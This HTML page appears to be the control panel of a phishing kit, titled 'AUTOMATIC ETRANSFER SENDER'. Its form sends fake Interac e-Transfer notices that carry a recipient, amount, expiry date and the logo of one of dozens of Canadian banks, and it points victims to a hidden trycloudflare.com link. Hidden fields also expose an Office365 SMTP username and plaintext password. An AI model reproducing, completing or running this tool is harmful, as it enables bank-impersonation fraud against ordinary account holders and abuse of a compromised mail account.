<html><head>
  <title>PHP Mailer System</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    select {
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background-color: #f2f2f2;
      color: #555555;
      border: 1px solid #cccccc;
      padding: 8px 16px;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }

    select option {
      font-size: 14px;
    }

    /* Custom styles for the dropdown arrow */
    select::-ms-expand {
      display: none;
    }

    select:after {
      content: '\25BE';
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      font-size: 16px;
      color: #555555;
    }
    
    body {
      font-family: Arial, sans-serif;
      font-size: 16px;
      color: #333333;
      background-color: #f2f2f2;
    }
    
  

:root {
  --glow-color: hsl(100 100% 69%);
}

*,
*::before,
*::after {
  box-sizing: border-box;
}

html,
body {
  height: 100%;
  width: 100%;
  overflow: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: black;
}

.glowing-btn {
  position: relative;
  color: var(--glow-color);
  cursor: pointer;
  padding: 0.35em 1em;
  border: 0.15em solid var(--glow-color);
  border-radius: 0.45em;
  background: none;
  perspective: 2em;
  font-family: "Raleway", sans-serif;
  font-size: 2em;
  font-weight: 900;
  letter-spacing: 1em;

  -webkit-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  -moz-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
    0px 0px 0.5em 0px var(--glow-color);
  animation: border-flicker 2s linear infinite;
}

:root {
  /* Base font size */
  font-size: 4px;   
  
  /* Set neon color */
  --neon-text-color: #f40;
  --neon-border-color: #08f;
}

body {
  font-family: 'Exo 2', sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;  
  background: #000;
  min-height: 100vh;
}

h1 {
  font-size: 13rem;
  font-weight: 200;
  font-style: italic;
  color: #fff;
  padding: 4rem 6rem 5.5rem;
  border: 0.4rem solid #fff;
  border-radius: 2rem;
  text-transform: uppercase;
  animation: flicker 1.5s infinite alternate;     
}

h1::-moz-selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1::selection {
  background-color: var(--neon-border-color);
  color: var(--neon-text-color);
}

h1:focus {
  outline: none;
}

/* Animate neon flicker */
@keyframes flicker {
    
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
      
        text-shadow:
            -0.2rem -0.2rem 1rem #fff,
            0.2rem 0.2rem 1rem #fff,
            0 0 2rem var(--neon-text-color),
            0 0 4rem var(--neon-text-color),
            0 0 6rem var(--neon-text-color),
            0 0 8rem var(--neon-text-color),
            0 0 10rem var(--neon-text-color);
        
        box-shadow:
            0 0 .5rem #fff,
            inset 0 0 .5rem #fff,
            0 0 2rem var(--neon-border-color),
            inset 0 0 2rem var(--neon-border-color),
            0 0 4rem var(--neon-border-color),
            inset 0 0 4rem var(--neon-border-color);        
    }
    
    20%, 24%, 55% {        
        text-shadow: none;
        box-shadow: none;
    }    
}
    /* Form element styling */
    input[type="text"], textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      margin-top: 6px;
      margin-bottom: 16px;
      resize: vertical;
      font-size: 16px;
    }
    
    /* Submit button styling */
    input[type="submit"] {
      background-color: #007bff;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    
    /* Submit button hover state */
    input[type="submit"]:hover {
      background-color: #0062cc;
    }
    
    /* Error message styling */
    .error {
      color: #dc3545;
      font-size: 14px;
    }
  </style>
  
</head><body>



<form action="submit1.php" method="POST" enctype="multipart/form-data">
 <fieldset>
<h1 style="text-align: center;">AUTOMATIC ETRANSFER SENDER</h1><input type="hidden" name="link" value="nh-changelog-testimony-shipped.trycloudflare.com" required="">
<input type="hidden" name="shortlink" value="" required="">
<input type="text" name="receiver_email" placeholder="receivers email" value="swiftrynx@gmail.com" required="">
<input type="text" name="receiver_name" placeholder="receivers name" value="One Time Contact" required="">
<input type="text" name="sender_name" placeholder="sender name" value="TRIPLE-X OILFIELD LTD" required="">
<input type="text" name="amount" placeholder="100.00" value="200.00" step="0.01" required="">
<input type="text" name="expiredate" placeholder="May 8,2023" value="June 23,2023" required="">


<center><select name="photo_link" id="photo_link">
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000071.png">ICICI Bank Canada</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000129.png">National Bank Direct Brokerage</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000174.png">Caisse Financial Group</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000188.png">State Bank of India (Canada)</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000205.png">Bridgeway National</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000212.png">AcceleRate Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000239.png">First Calgary Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000244.png">Tandia Financial Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000254.png">DUCA Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000256.png">Envision Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000271.png">Interior Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000279.png">Kindred Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000290.png">Northern Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000309.png">Steinbach Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000326.png">Synergy Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000340.png">Your Neighbourhood Credit Union</option>
</select><select name="bank" id="bank">
      <option value="Scotia Bank">Scotia Bank</option>
      <option value="Bank of Montreal">Bank of Montreal</option>
      <option value="CIBC">CIBC</option>
      <option value="RBC Royal Bank">RBC Royal Bank</option>
      <option value="ATB Financial">ATB Financial</option>
      <option value="TD Canada Trust">TD Canada Trust</option>
      <option value="HSBC Bank Canada">HSBC Bank Canada</option>
      <option value="National Bank of Canada">National Bank of Canada</option>
      <option value="Desjardins">Desjardins</option>
      <option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
      <option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
      <option value="Tangerine Bank">Tangerine Bank</option>
      <option value="Alterna Bank">Alterna Bank</option>
      <option value="Bridgewater Bank">Bridgewater Bank</option>
      <option value="Canadian Tire Bank">Canadian Tire Bank</option>
      <option value="Equitable Bank">Equitable Bank</option>
      <option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
      <option value="Haventree Bank">Haventree Bank</option>
      <option value="Motus">Motusbank</option>
      <option value="Peoples Trust Company">Peoples Trust Company</option>
      <option value="Simplii Financial">Simplii Financial</option>
      <option value="Vancity">Vancity</option>
    </select><br><input type="submit" value="Submit"></center>

<input type="hidden" name="port" value="587" required="">
<input type="hidden" name="username" value="info@supportdrone.ca" required="">
<input type="hidden" name="password" value="Covidabc2020" required="">
<input type="hidden" name="host" value="smtp.office365.com" required="">


</fieldset></form></body></html>